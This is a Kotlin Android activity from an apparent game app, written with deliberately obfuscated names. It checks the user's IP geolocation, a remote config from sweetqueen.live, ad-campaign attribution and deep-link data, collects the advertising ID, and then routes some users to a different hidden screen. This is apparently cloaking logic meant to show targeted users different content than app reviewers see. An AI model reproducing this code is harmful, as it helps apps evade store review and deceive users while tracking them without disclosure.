package com.edkongames

import android.content.Context
import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.edkongames.databinding.ActivityMainBinding
import com.edkongames.qwwe.Nyissuw.Companion.rokkosdf
import com.edkongames.qwwe.Nyissuw.Companion.onkovbjiv
import com.edkongames.qwwe.Nyissuw.Companion.fiijdosd
import com.edkongames.qwwe.Nyissuw.Companion.foksfd
import com.edkongames.qwwe.Nyissuw.Companion.obkvnko
import com.edkongames.fres.Ziausiaidwq
import com.edkongames.jusoa.Kiusdja
import com.edkongames.qwwe.Cdestyauw
import com.facebook.applinks.AppLinkData
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.orhanobut.hawk.Hawk
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {
    lateinit var orkofkd: ActivityMainBinding

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        orkofkd = ActivityMainBinding.inflate(layoutInflater)
        setContentView(orkofkd.root)

        tokkokfogogfk(this)
        GlobalScope.launch(Dispatchers.IO) {
            xijci
        }

        AppsFlyerLib.getInstance()
            .init("MmkEpndVAW4TccdkfNv46V", zoxkzoksaijdjww, applicationContext)
        AppsFlyerLib.getInstance().start(this)

    }
    fun tokkokfogogfk(covkkxv: Context) {
        AppLinkData.fetchDeferredAppLinkData(
            covkkxv
        ) { icvjxji: AppLinkData? ->
            icvjxji?.let {
                val sdudusd = icvjxji.targetUri.host.toString()
                Hawk.put(fiijdosd, sdudusd)
            }
            if (icvjxji == null) {

            }
        }
    }




    private suspend fun ckixvjxcuhxc(): String? {
        val qowskdoksad = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://pro.ip-api.com/")
            .build()
            .create(Kiusdja::class.java)

        val okfogko = qowskdoksad.rokokew().body()?.dpslcxk
        Log.d("dfsfe", "hjy: $okfogko ")
        return okfogko

    }


    private suspend fun xijcxjiz(): String? {
        val iajids = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://sweetqueen.live/")
            .build()
            .create(Kiusdja::class.java)

        val jcnxzjj = iajids.zokxzokx().body()?.optko
        Log.d("dsfsd", "sadw: $jcnxzjj")
        val wokdoaskji = iajids.zokxzokx().body()?.aookzxis
        Hawk.put(obkvnko, wokdoaskji)
        Hawk.put(rokkosdf, jcnxzjj)
        Log.d("cxzsade", "sdaswd: ${Hawk.get(rokkosdf, "null")}")
        Log.d("wwdqccas", "dfsdd: ${Hawk.get(obkvnko, "null")}")
        val xokcokcxzko = iajids.zokxzokx().body()?.fiodsk
        Log.d("cvcxvxvds", xokcokcxzko.toString())
        return xokcokcxzko
    }

    private val zoxkzoksaijdjww = object : AppsFlyerConversionListener {
        override fun onConversionDataSuccess(cixjzij: MutableMap<String, Any>?) {
            val rokds = cixjzij?.get("campaign").toString()
            Hawk.put(foksfd, rokds)
        }

        override fun onConversionDataFail(p0: String?) {
            Log.e("wdedw", "error getting conversion data: $p0" );
        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {

        }

        override fun onAttributionFailure(p0: String?) {
        }
    }


    private val xijci: Job = GlobalScope.launch(Dispatchers.IO) {
        val lokkasodaji: String = ckixvjxcuhxc().toString()
        val cxijjicxvji = xijcxjiz().toString()
        val qokwksjidaji: String? = Hawk.get(fiijdosd, "null") //здесь нужен дефолтный ноль
        val cij = Hawk.get(obkvnko, "null")
        var coxkkxzckox: String? = Hawk.get(foksfd)
        suidj()
        if (cij == "1") {
            val rijisdjia = Executors.newSingleThreadScheduledExecutor()
            rijisdjia.scheduleAtFixedRate({
                if (coxkkxzckox != null) {
                    Log.d("DFEsd", coxkkxzckox.toString())

                    if (coxkkxzckox!!.contains("tdb2") || cxijjicxvji.contains(lokkasodaji) || qokwksjidaji!!.contains("tdb2")) {
                        Log.d("czxcsds", "dwdw: $coxkkxzckox")
                        rijisdjia.shutdown()
                        startActivity(Intent(this@MainActivity, Ziausiaidwq::class.java))
                        finish()
                    } else {
                        rijisdjia.shutdown()
                        startActivity(Intent(this@MainActivity, Cdestyauw::class.java))
                        finish()
                    }
                } else {
                    coxkkxzckox = Hawk.get(foksfd)
                    Log.d("jhgn", "Received null $coxkkxzckox")
                }

            }, 0, 2, TimeUnit.SECONDS)
        }
        else if (cxijjicxvji.contains(lokkasodaji)) {
            startActivity(Intent(this@MainActivity, Ziausiaidwq::class.java))
            finish()
        } else {
            startActivity(Intent(this@MainActivity, Cdestyauw::class.java))
            finish()
        }
    }


    private fun suidj(){
        val fprkokodsko = AdvertisingIdClient(applicationContext)
        fprkokodsko.start()
        val kickvi = fprkokodsko.info.id
        Log.d("hthth = ", kickvi.toString())
        Hawk.put(onkovbjiv, kickvi)
    }





}